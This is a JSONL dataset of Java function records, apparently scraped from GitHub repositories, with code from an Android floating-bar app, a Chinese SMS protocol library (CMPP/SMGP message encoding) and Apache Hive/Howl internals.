{"docstring": "// /////////////////////////////////////////////////////////////////////////\n", "func_signal": "public void doSwipUp(AccessibilityService service)", "code": "{\n\tString swip = sharedPreferences.getString(\"swipUp\", \"closeBar\");\n\tdoOperation(service, swip);\n\t/*\n\t * String activity = Util.getRunningActivityName(service);\n\t * System.out.println(activity); Toast.makeText(mContext, activity,\n\t * 1).show();\n\t */\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\util\\Prefs.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "/**\n *\n * @param i\n * @return\n */\n", "func_signal": "public static byte[] longToBytes8(long i)", "code": "{\n    byte abyte0[] = new byte[8];\n    abyte0[7] = (byte)(0xffL & i);\n    abyte0[6] = (byte)((0xff00L & i) >> 8);\n    abyte0[5] = (byte)((0xff0000L & i) >> 16);\n    abyte0[4] = (byte)((0xff000000L & i) >> 24);\n    abyte0[3] = (byte)((0xff00000000L & i) >> 32);\n    abyte0[2] = (byte)((0xff0000000000L & i) >> 40);\n    abyte0[1] = (byte)((0xff000000000000L & i) >> 48);\n    abyte0[0] = (byte)((0xff00000000000000L & i) >> 56);\n    return abyte0;\n}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\cmpp\\util\\ByteUtil.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "//id:XXXXXXXXXX sub:000 dlvrd:000 submit date:0901151559 done date:0901151559 stat:DELIVRD err:000 text:\n", "func_signal": "public boolean fromBytes(byte[] bytes) throws Exception", "code": "{\n\n\tint offset=0;\n\tbyte[] tmp = null;\n\t\n\toffset+=\"id:\".length();\n\t\n\tmsgId=new byte[10];\n\tSystem.arraycopy(bytes, offset, msgId, 0, 10);\n\toffset+=10;\n\t\n\toffset+=\" sub:\".length();\n\t\n\ttmp = new byte[3];\n\tSystem.arraycopy(bytes, offset, tmp, 0, 3);\n\tsub = new String(ByteUtil.rtrimBytes(tmp));\n\toffset += 3;\n\n\toffset+=\" dlvrd:\".length();\n\t\n\ttmp = new byte[3];\n\tSystem.arraycopy(bytes, offset, tmp, 0, 3);\n\tdlvrd = new String(ByteUtil.rtrimBytes(tmp));\n\toffset += 3;\n\n\toffset+=\" submit date:\".length();\n\t\n\ttmp = new byte[10];\n\tSystem.arraycopy(bytes, offset, tmp, 0, 10);\n\tsubTime = new String(ByteUtil.rtrimBytes(tmp));\n\toffset += 10;\n\n\toffset+=\" done date:\".length();\n\t\n\ttmp = new byte[10];\n\tSystem.arraycopy(bytes, offset, tmp, 0, 10);\n\tdoneTime = new String(ByteUtil.rtrimBytes(tmp));\n\toffset += 10;\n\t\n\toffset+=\" stat:\".length();\n\n\ttmp = new byte[7];\n\tSystem.arraycopy(bytes, offset, tmp, 0, 7);\n\tstat = new String(ByteUtil.rtrimBytes(tmp));\n\toffset += 7;\n\t\n\toffset+=\" err:\".length();\n\n\ttmp = new byte[3];\n\tSystem.arraycopy(bytes, offset, tmp, 0, 3);\n\terr = new String(ByteUtil.rtrimBytes(tmp));\n\toffset += 3;\n\t\n\toffset+=\" text:\".length();\n\n\ttmp = new byte[20];\n\tSystem.arraycopy(bytes, offset, tmp, 0, 20);\n\ttxt = new String(ByteUtil.rtrimBytes(tmp));\n\toffset += 20;\n\n\t\n\treturn true;\n}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\smgp\\message\\SMGPReportData.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "//\u6d88\u606f\u6d41\u6c34\u53f7\n", "func_signal": "public CMPPBaseMessage(int commandId, int commandLength)", "code": "{\n       this.commandId =  commandId;\n        this.commandLength =commandLength;\n    }", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\cmpp\\message\\CMPPBaseMessage.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "/**\n * \u8bbe\u7f6e\u4e8c\u8fdb\u5236\u5185\u5bb9\n */\n", "func_signal": "public void setMsgContent(byte[] msgContent, int msgFmt)", "code": "{\n    // set\n    this.msgFmt     = msgFmt;\n    this.msgContent = msgContent;\n    if( msgContent == null ) {\n        msgLength = 0;\n    } else {\n        if( msgFmt == 0 ) {\n            if( msgContent.length > maxMsgLength0 ) {\n                msgContent = new byte[maxMsgLength0];\n                ByteUtil.bytesCopy(msgContent, msgContent, 0, maxMsgLength0 - 1, 0);\n            }\n        } else {\n            if( msgContent.length > maxMsgLength1 ) {\n                msgContent = new byte[maxMsgLength1];\n                ByteUtil.bytesCopy(msgContent, msgContent, 0, maxMsgLength1 - 1, 0);\n            }\n        }\n        msgLength  = msgContent.length;\n    }\n}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\cmpp\\message\\CMPPDeliverMessage.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "/**\n * \u8bbe\u7f6e\u6587\u672c\u5185\u5bb9\n * \u4fe1\u606f\u683c\u5f0f: 0\uff1aASCII\u4e32 3\uff1a\u77ed\u4fe1\u5199\u5361\u64cd\u4f5c 4\uff1a\u4e8c\u8fdb\u5236\u4fe1\u606f 8\uff1aUCS2\u7f16\u7801 15\uff1a\u542bGB\u6c49\u5b57\n */\n", "func_signal": "public void setMsgText(String msgText, int msgFmt)", "code": "{\n\n    byte[]  binCnt = null;\n    //0\uff1a\u7eafASCII\u5b57\u7b26\u4e32\n    //3\uff1a\u5199\u5361\u64cd\u4f5c\n    //4\uff1a\u4e8c\u8fdb\u5236\u7f16\u7801\n    //8\uff1aUCS2\u7f16\u7801\n    //15: GBK\u7f16\u7801\n    try {\n        switch( msgFmt ) {\n            case 0:\n                binCnt = msgText.getBytes(\"US-ASCII\");\n                break;\n            case 3:\n                binCnt = msgText.getBytes(\"US-ASCII\");\n            case 4:\n                binCnt = msgText.getBytes(\"US-ASCII\");\n            case 8:\n                binCnt = msgText.getBytes(\"ISO-10646-UCS-2\");\n                break;\n            case 15:\n                binCnt = msgText.getBytes(\"GBK\");\n                break;\n            default:\n                binCnt = msgText.getBytes();\n        }\n    } catch (UnsupportedEncodingException e) {\n        binCnt = msgText.getBytes();\n    }\n    // set\n    setMsgContent(binCnt,msgFmt);\n}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\cmpp\\message\\CMPPDeliverMessage.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "/**\n *\n */\n", "func_signal": "protected byte[] getBody()", "code": "{\n\n    // make bodybytes\n    int bodyLength = getCommandLength();\n    byte[] bodyBytes  = new byte[bodyLength];\n    Arrays.fill(bodyBytes,(byte)0);\n\n    // make parameter\n\n    // make body\n    int off = 0;\n    ByteUtil.bytesCopy(ByteUtil.longToBytes8(msgId), bodyBytes, 0, 7, off);\n    off += 8;\n    bodyBytes[off] = ByteUtil.intToByte(result);\n    off += 1;\n\n    return bodyBytes;\n}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\cmpp\\message\\CMPPDeliverRespMessage.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "//\u53d6\u503c\u8303\u56f4\u4e3a 0x00000001-0x7FFFFFFF\n", "func_signal": "public static synchronized int nextSequence()", "code": "{\n\t//\u5faa\u73af\u8ba1\u6570\n\tif (seqId == Integer.MAX_VALUE) {\n\t\tseqId = 0;\n\t}\n\n\treturn seqId++;\n}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\cmpp\\util\\SequenceGenerator.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "/**\n * \u5b57\u8282\u6570\u7ec4\u8f6c\u6362\u621016\u8fdb\u5236\u53ef\u6253\u5370\u5b57\u7b26\u4e32\n * @param b\n * @param charset\n * @return\n */\n", "func_signal": "private String byteToHexString(byte[] b, String charset)", "code": "{\n    String  str = null;\n\n    if( b == null ) {\n        return null;\n    }\n    if( charset != null ) {\n        try {\n            str = new String(b, charset);\n        } catch (UnsupportedEncodingException e1) {\n            StringBuffer sb = new StringBuffer();\n            for( int i=0; i<b.length; i++ ) {        // con't change, change to binary\n                char chHi  = Character.forDigit((b[i]&0xF0)>>4    ,16);\n                char chLow = Character.forDigit((b[i]&0x0F) ,16);\n                sb.append(chHi);\n                sb.append(chLow);\n                sb.append(' ');\n            }\n            str = sb.toString().toUpperCase();\n        }\n    } else {\n        str = new String(b);\n    }\n    return str;\n}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\cmpp\\message\\CMPPDeliverMessage.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "/**\n * to protableString\n * @param b\n * @return\n */\n", "func_signal": "private String toPrintableString(byte[] b)", "code": "{\n\n    if( b == null ) return null;\n\n    StringBuffer sb = new StringBuffer();\n    byte[] t = new byte[1];\n    for( int i=0; i<b.length; i++ ) {        // con't change, change to binary\n        if( b[i]>=0x20 && b[i]<=0x7e ) {  // printable char\n            t[0] = b[i];\n            sb.append(new String(t));\n        } else {                            //non-pritable char\n            sb.append(\".\");\n        }\n    }\n    return sb.toString();\n}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\cmpp\\message\\CMPPDeliverMessage.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "/**\n * \u6839\u636e\u5f53\u524d\u7684MsgFmt\u5f97\u5230MsgContent\u6587\u672c\n */\n", "func_signal": "public String getMsgText()", "code": "{\n    String msgText = null;\n\n    if( msgContent == null )\n        return null;\n\n    //0\uff1a\u7eafASCII\u5b57\u7b26\u4e32\n    //3\uff1a\u5199\u5361\u64cd\u4f5c\n    //4\uff1a\u4e8c\u8fdb\u5236\u7f16\u7801\n    //8\uff1aUCS2\u7f16\u7801\n    //15: GBK\u7f16\u7801\n    try {\n        switch( msgFmt ) {\n            case 0:\n                msgText = new String(msgContent, \"US-ASCII\");\n                break;\n            case 3:\n                msgText = new String(msgContent, \"US-ASCII\");\n                break;\n            case 4:\n                msgText = toPrintableString(msgContent);\n                break;\n            case 8:\n                msgText = new String(msgContent, \"ISO-10646-UCS-2\");\n                break;\n            case 15:\n                msgText = new String(msgContent, \"GBK\");\n                break;\n            default:\n                msgText = toPrintableString(msgContent);\n        }\n    } catch (UnsupportedEncodingException e) {\n        msgText = toPrintableString(msgContent);\n    }\n    return msgText;\n}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\cmpp\\message\\CMPPDeliverMessage.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "/**\n *\n * @param i\n * @return\n */\n", "func_signal": "public static byte[] intToBytes4(int i)", "code": "{\n    byte abyte0[] = new byte[4];\n    abyte0[3] = (byte)(0xff & i);\n    abyte0[2] = (byte)((0xff00 & i) >> 8);\n    abyte0[1] = (byte)((0xff0000 & i) >> 16);\n    abyte0[0] = (byte)((0xff000000 & i) >> 24);\n    return abyte0;\n}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\cmpp\\util\\ByteUtil.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "/** Sets all the necessary params of the TLV. */\n", "func_signal": "public TLV(short tag, int min, int max)", "code": "{\n\tsuper();\n\tthis.tag = tag;\n\tminLength = min;\n\tmaxLength = max;\n}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\smgp\\tlv\\TLV.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "// 4\n", "func_signal": "@Override\n\tprotected int setBody(byte[] bodyBytes) throws Exception", "code": "{\n\t\tint offset = 0;\n\t\t\n\t\tmsgId=new byte[10];\n\t\tSystem.arraycopy(bodyBytes, offset, msgId, 0, 10);\n\t\toffset += 10;\n\n\t\tstatus = ByteUtil.byte2int(bodyBytes, offset);\n\t\toffset += 4;\n\t\treturn offset;\n\t}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\smgp\\message\\SMGPDeliverRespMessage.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "/**\n *\n * @param i\n * @param abyte0\n */\n", "func_signal": "public static void intToBytes(int i, byte abyte0[])", "code": "{\n    abyte0[1] = (byte)(0xff & i);\n    abyte0[0] = (byte)((0xff00 & i) >> 8);\n}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\cmpp\\util\\ByteUtil.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "/**\n * 8 bytes to long\n * @param abyte0\n * @return\n */\n", "func_signal": "public static long Bytes8ToLong(byte abyte0[])", "code": "{\n    long ret = 0;\n\n    ret = (0xffL & abyte0[0]) << 56 | (0xffL & abyte0[1]) << 48 | (0xffL & abyte0[2]) << 40 | (0xffL & abyte0[3]) << 32 | (0xffL & abyte0[4]) << 24 | (0xffL & abyte0[5]) << 16 | (0xffL & abyte0[6]) << 8 | 0xffL & abyte0[7];\n\n    return ret;\n}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\cmpp\\util\\ByteUtil.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "/**\n *\n * @param srcAbyte\n * @param destAbyte\n * @param srcFrom: srcindex\n * @param srcTo\n * @param destFrom\n */\n", "func_signal": "public static void bytesCopy(byte srcAbyte[], byte destAbyte[], int srcFrom, int srcTo, int destFrom)", "code": "{\n    // check null\n    if( srcAbyte == null || destAbyte == null  ) {\n        return;\n    }\n    // copy\n    int i1 = 0;\n    for(int l = srcFrom; l <= srcTo; l++ )\n    {\n        if( destFrom + i1 >= destAbyte.length ) {\n            break;\n        }\n        if( l >= srcAbyte.length ) {\n            break;\n        }\n        destAbyte[destFrom + i1] = srcAbyte[l];\n        i1++;\n    }\n}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\cmpp\\util\\ByteUtil.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "/**\n *\n * @param i\n * @return\n */\n", "func_signal": "public static byte[] intToBytes(int i)", "code": "{\n    byte abyte0[] = new byte[2];\n    abyte0[1] = (byte)(0xff & i);\n    abyte0[0] = (byte)((0xff00 & i) >> 8);\n    return abyte0;\n}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\cmpp\\util\\ByteUtil.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "/**\n *\n * @param i\n * @param abyte0\n */\n", "func_signal": "public static void intToBytes4(int i, byte abyte0[])", "code": "{\n    abyte0[3] = (byte)(0xff & i);\n    abyte0[2] = (byte)((0xff00 & i) >> 8);\n    abyte0[1] = (byte)((0xff0000 & i) >> 16);\n    abyte0[0] = (byte)(int)((0xffffffffff000000L & (long)i) >> 24);\n}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\cmpp\\util\\ByteUtil.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "/**\n *\n */\n", "func_signal": "protected void setBody(byte[] bodyBytes)", "code": "{\n\n    byte[] abyte0 = new byte[21];\n    int off = 0;\n\n    Arrays.fill(abyte0, (byte) 0);\n    ByteUtil.bytesCopy(bodyBytes, abyte0, off, off + 7, 0);\n    msgId = ByteUtil.Bytes8ToLong(abyte0);\n    off += 8;\n\n    Arrays.fill(abyte0,(byte)0);\n    ByteUtil.bytesCopy(bodyBytes, abyte0, off, off, 0);\n    result = ByteUtil.byteToInt(abyte0[0]);\n    off += 1;\n\n}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\cmpp\\message\\CMPPDeliverRespMessage.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "/**\n * \u5f97\u5230\u6d88\u606f\u768416\u8fdb\u5236\u6587\u672c\u3002\n */\n", "func_signal": "public String getMsgHexText()", "code": "{\n    String msgText = null;\n\n    if( msgContent == null )\n        return null;\n\n    //0\uff1a\u7eafASCII\u5b57\u7b26\u4e32\n    //3\uff1a\u5199\u5361\u64cd\u4f5c\n    //4\uff1a\u4e8c\u8fdb\u5236\u7f16\u7801\n    //8\uff1aUCS2\u7f16\u7801\n    //15: GBK\u7f16\u7801\n    switch( msgFmt ) {\n        case 0:\n            msgText = byteToHexString(msgContent,\"US-ASCII\");\n            break;\n        case 3:\n            msgText = byteToHexString(msgContent,\"US-ASCII\");\n            break;\n        case 4:\n            msgText = byteToHexString(msgContent,\"BIN\");\n            break;\n        case 8:\n            msgText = byteToHexString(msgContent,\"ISO-10646-UCS-2\");\n            break;\n        case 15:\n            msgText = byteToHexString(msgContent,\"GBK\");\n            break;\n        default:\n            msgText = byteToHexString(msgContent, null);\n    }\n    return msgText;\n}", "path": "src\\main\\java\\com\\netgao\\sms\\protocol\\cmpp\\message\\CMPPDeliverMessage.java", "repo_name": "clonalman/SMS-China", "stars": 95, "license": "None", "language": "java", "size": 187}
{"docstring": "/**\n * Get a thread-local typed bytes record input for the supplied\n * {@link TypedBytesOutput}.\n * \n * @param out\n *          typed bytes output object\n * @return typed bytes record output corresponding to the supplied\n *         {@link TypedBytesOutput}.\n */\n", "func_signal": "public static TypedBytesRecordOutput get(TypedBytesOutput out)", "code": "{\n  TypedBytesRecordOutput bout = (TypedBytesRecordOutput) tbOut.get();\n  bout.setTypedBytesOutput(out);\n  return bout;\n}", "path": "contrib\\src\\java\\org\\apache\\hadoop\\hive\\contrib\\util\\typedbytes\\TypedBytesRecordOutput.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "/**\n * Find the _Fields constant that matches fieldId, or null if its not found.\n */\n", "func_signal": "public static _Fields findByThriftId(int fieldId)", "code": "{\n  switch(fieldId) {\n    case 1: // MESSAGE\n      return MESSAGE;\n    default:\n      return null;\n  }\n}", "path": "metastore\\src\\gen\\thrift\\gen-javabean\\org\\apache\\hadoop\\hive\\metastore\\api\\InvalidObjectException.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "/**\n * @return 0 on success -1 on failure\n */\n", "func_signal": "@Override\npublic Object evaluate(DeferredObject[] arguments) throws HiveException", "code": "{\n\n  url = ((StringObjectInspector) argumentOI[0])\n      .getPrimitiveJavaObject(arguments[0].get());\n  user = ((StringObjectInspector) argumentOI[1])\n      .getPrimitiveJavaObject(arguments[1].get());\n  pass = ((StringObjectInspector) argumentOI[2])\n      .getPrimitiveJavaObject(arguments[2].get());\n\n  try {\n    connection = DriverManager.getConnection(url, user, pass);\n  } catch (SQLException ex) {\n    LOG.error(\"Driver loading or connection issue\", ex);\n    result.set(2);\n  }\n\n  if (connection != null) {\n    try {\n\n      PreparedStatement ps = connection\n          .prepareStatement(((StringObjectInspector) argumentOI[3])\n          .getPrimitiveJavaObject(arguments[3].get()));\n      for (int i = 4; i < arguments.length; ++i) {\n        PrimitiveObjectInspector poi = ((PrimitiveObjectInspector) argumentOI[i]);\n        ps.setObject(i - 3, poi.getPrimitiveJavaObject(arguments[i].get()));\n      }\n      ps.execute();\n      ps.close();\n      result.set(0);\n    } catch (SQLException e) {\n      LOG.error(\"Underlying SQL exception\", e);\n      result.set(1);\n    } finally {\n      try {\n        connection.close();\n      } catch (Exception ex) {\n        LOG.error(\"Underlying SQL exception during close\", ex);\n      }\n    }\n  }\n\n  return result;\n}", "path": "contrib\\src\\java\\org\\apache\\hadoop\\hive\\contrib\\genericudf\\example\\GenericUDFDBOutput.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "/**\n * Performs a deep copy on <i>other</i>.\n */\n", "func_signal": "public UnknownTableException(UnknownTableException other)", "code": "{\n  if (other.isSetMessage()) {\n    this.message = other.message;\n  }\n}", "path": "metastore\\src\\gen\\thrift\\gen-javabean\\org\\apache\\hadoop\\hive\\metastore\\api\\UnknownTableException.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "/**\n * This function will be called by GroupByOperator when it sees a new input\n * row.\n * \n * @param agg\n *          The object to store the aggregation result.\n * @param parameters\n *          The row, can be inspected by the OIs passed in init().\n */\n", "func_signal": "public void aggregate(AggregationBuffer agg, Object[] parameters) throws HiveException", "code": "{\n  if (mode == Mode.PARTIAL1 || mode == Mode.COMPLETE) {\n    iterate(agg, parameters);\n  } else {\n    assert (parameters.length == 1);\n    merge(agg, parameters[0]);\n  }\n}", "path": "ql\\src\\java\\org\\apache\\hadoop\\hive\\ql\\udf\\generic\\GenericUDAFEvaluator.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "/**\n * Find the _Fields constant that matches fieldId, throwing an exception\n * if it is not found.\n */\n", "func_signal": "public static _Fields findByThriftIdOrThrow(int fieldId)", "code": "{\n  _Fields fields = findByThriftId(fieldId);\n  if (fields == null) throw new IllegalArgumentException(\"Field \" + fieldId + \" doesn't exist!\");\n  return fields;\n}", "path": "metastore\\src\\gen\\thrift\\gen-javabean\\org\\apache\\hadoop\\hive\\metastore\\api\\InvalidObjectException.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "// returns true if there are elements in key list and any of them is null\n", "func_signal": "protected boolean hasAnyNulls(Object[] key)", "code": "{\n  if (key != null && key.length> 0) {\n    for (Object k : key) {\n      if (k == null) {\n        return true;\n      }\n    }\n  }\n  return false;\n}", "path": "ql\\src\\java\\org\\apache\\hadoop\\hive\\ql\\exec\\AbstractMapJoinOperator.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "/**\n * Returns a new Token object, by default. However, if you want, you can\n * create and return subclass objects based on the value of ofKind. Simply add\n * the cases to the switch for all those special cases. For example, if you\n * have a subclass of Token called IDToken that you want to create if ofKind\n * is ID, simlpy add something like :\n * \n * case MyParserConstants.ID : return new IDToken();\n * \n * to the following switch statement. Then you can cast matchedToken variable\n * to the appropriate type and use it in your lexical actions.\n */\n", "func_signal": "public static final Token newToken(int ofKind)", "code": "{\n  switch (ofKind) {\n  default:\n    return new Token();\n  }\n}", "path": "serde\\src\\java\\org\\apache\\hadoop\\hive\\serde2\\dynamic_type\\Token.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "/** Returns true if field corresponding to fieldID is set (has been asigned a value) and false otherwise */\n", "func_signal": "public boolean isSet(_Fields field)", "code": "{\n  if (field == null) {\n    throw new IllegalArgumentException();\n  }\n\n  switch (field) {\n  case MESSAGE:\n    return isSetMessage();\n  }\n  throw new IllegalStateException();\n}", "path": "metastore\\src\\gen\\thrift\\gen-javabean\\org\\apache\\hadoop\\hive\\metastore\\api\\UnknownTableException.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "/**\n * Initialize the evaluator.\n * \n * @param m\n *          The mode of aggregation.\n * @param parameters\n *          The ObjectInspector for the parameters: In PARTIAL1 and COMPLETE\n *          mode, the parameters are original data; In PARTIAL2 and FINAL\n *          mode, the parameters are just partial aggregations (in that case,\n *          the array will always have a single element).\n * @return The ObjectInspector for the return value. In PARTIAL1 and PARTIAL2\n *         mode, the ObjectInspector for the return value of\n *         terminatePartial() call; In FINAL and COMPLETE mode, the\n *         ObjectInspector for the return value of terminate() call.\n * \n *         NOTE: We need ObjectInspector[] (in addition to the TypeInfo[] in\n *         GenericUDAFResolver) for 2 reasons: 1. ObjectInspector contains\n *         more information than TypeInfo; and GenericUDAFEvaluator.init at\n *         execution time. 2. We call GenericUDAFResolver.getEvaluator at\n *         compilation time,\n */\n", "func_signal": "public ObjectInspector init(Mode m, ObjectInspector[] parameters) throws HiveException", "code": "{\n  // This function should be overriden in every sub class\n  // And the sub class should call super.init(m, parameters) to get mode set.\n  mode = m;\n  return null;\n}", "path": "ql\\src\\java\\org\\apache\\hadoop\\hive\\ql\\udf\\generic\\GenericUDAFEvaluator.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "/**\n * Returns a converter that converts objects from one OI to another OI. The\n * returned (converted) object belongs to this converter, so that it can be\n * reused across different calls.\n */\n", "func_signal": "public static Converter getConverter(ObjectInspector inputOI,\n    ObjectInspector outputOI)", "code": "{\n  // If the inputOI is the same as the outputOI, just return an\n  // IdentityConverter.\n  if (inputOI == outputOI) {\n    return new IdentityConverter();\n  }\n  switch (outputOI.getCategory()) {\n  case PRIMITIVE:\n    switch (((PrimitiveObjectInspector) outputOI).getPrimitiveCategory()) {\n    case BOOLEAN:\n      return new PrimitiveObjectInspectorConverter.BooleanConverter(\n          (PrimitiveObjectInspector) inputOI,\n          (SettableBooleanObjectInspector) outputOI);\n    case BYTE:\n      return new PrimitiveObjectInspectorConverter.ByteConverter(\n          (PrimitiveObjectInspector) inputOI,\n          (SettableByteObjectInspector) outputOI);\n    case SHORT:\n      return new PrimitiveObjectInspectorConverter.ShortConverter(\n          (PrimitiveObjectInspector) inputOI,\n          (SettableShortObjectInspector) outputOI);\n    case INT:\n      return new PrimitiveObjectInspectorConverter.IntConverter(\n          (PrimitiveObjectInspector) inputOI,\n          (SettableIntObjectInspector) outputOI);\n    case LONG:\n      return new PrimitiveObjectInspectorConverter.LongConverter(\n          (PrimitiveObjectInspector) inputOI,\n          (SettableLongObjectInspector) outputOI);\n    case FLOAT:\n      return new PrimitiveObjectInspectorConverter.FloatConverter(\n          (PrimitiveObjectInspector) inputOI,\n          (SettableFloatObjectInspector) outputOI);\n    case DOUBLE:\n      return new PrimitiveObjectInspectorConverter.DoubleConverter(\n          (PrimitiveObjectInspector) inputOI,\n          (SettableDoubleObjectInspector) outputOI);\n    case STRING:\n      if (outputOI instanceof WritableStringObjectInspector) {\n        return new PrimitiveObjectInspectorConverter.TextConverter(\n            (PrimitiveObjectInspector) inputOI);\n      } else if (outputOI instanceof JavaStringObjectInspector) {\n        return new PrimitiveObjectInspectorConverter.StringConverter(\n            (PrimitiveObjectInspector) inputOI);\n      }\n    default:\n      throw new RuntimeException(\"Hive internal error: conversion of \"\n          + inputOI.getTypeName() + \" to \" + outputOI.getTypeName()\n          + \" not supported yet.\");\n    }\n  case STRUCT:\n    return new StructConverter((StructObjectInspector) inputOI,\n        (SettableStructObjectInspector) outputOI);\n  case LIST:\n    return new ListConverter((ListObjectInspector) inputOI,\n        (SettableListObjectInspector) outputOI);\n  case MAP:\n    return new MapConverter((MapObjectInspector) inputOI,\n        (SettableMapObjectInspector) outputOI);\n  default:\n    throw new RuntimeException(\"Hive internal error: conversion of \"\n        + inputOI.getTypeName() + \" to \" + outputOI.getTypeName()\n        + \" not supported yet.\");\n  }\n}", "path": "serde\\src\\java\\org\\apache\\hadoop\\hive\\serde2\\objectinspector\\ObjectInspectorConverters.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "/**\n * Performs a deep copy on <i>other</i>.\n */\n", "func_signal": "public InvalidObjectException(InvalidObjectException other)", "code": "{\n  if (other.isSetMessage()) {\n    this.message = other.message;\n  }\n}", "path": "metastore\\src\\gen\\thrift\\gen-javabean\\org\\apache\\hadoop\\hive\\metastore\\api\\InvalidObjectException.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "/**\n * More stuff needs to be added here. Currently it only checks some basic\n * file naming libraries\n * The old test was deactivated as part of hive-405\n */\n", "func_signal": "public void testFileSinkOperator() throws Throwable", "code": "{\n\n  try {\n    testTaskIds (new String [] {\n        \"attempt_200707121733_0003_m_000005_0\",\n        \"attempt_local_0001_m_000005_0\",\n        \"task_200709221812_0001_m_000005_0\",\n        \"task_local_0001_m_000005_0\"\n      }, \"000005_0\", \"000005\");\n\n    testTaskIds (new String [] {\n        \"job_local_0001_map_000005\",\n        \"job_local_0001_reduce_000005\",\n      }, \"000005\", \"000005\");\n\n    testTaskIds (new String [] {\"1234567\"},\n                 \"1234567\", \"1234567\");\n\n    assertEquals(Utilities.getTaskIdFromFilename\n                 (\"/mnt/dev005/task_local_0001_m_000005_0\"),\n                 \"000005\");\n\n    System.out.println(\"FileSink Operator ok\");\n  } catch (Throwable e) {\n    e.printStackTrace();\n    throw e;\n  }\n}", "path": "ql\\src\\test\\org\\apache\\hadoop\\hive\\ql\\exec\\TestOperators.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "/**\n * Find the _Fields constant that matches fieldId, or null if its not found.\n */\n", "func_signal": "public static _Fields findByThriftId(int fieldId)", "code": "{\n  switch(fieldId) {\n    case 1: // MESSAGE\n      return MESSAGE;\n    default:\n      return null;\n  }\n}", "path": "metastore\\src\\gen\\thrift\\gen-javabean\\org\\apache\\hadoop\\hive\\metastore\\api\\UnknownTableException.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
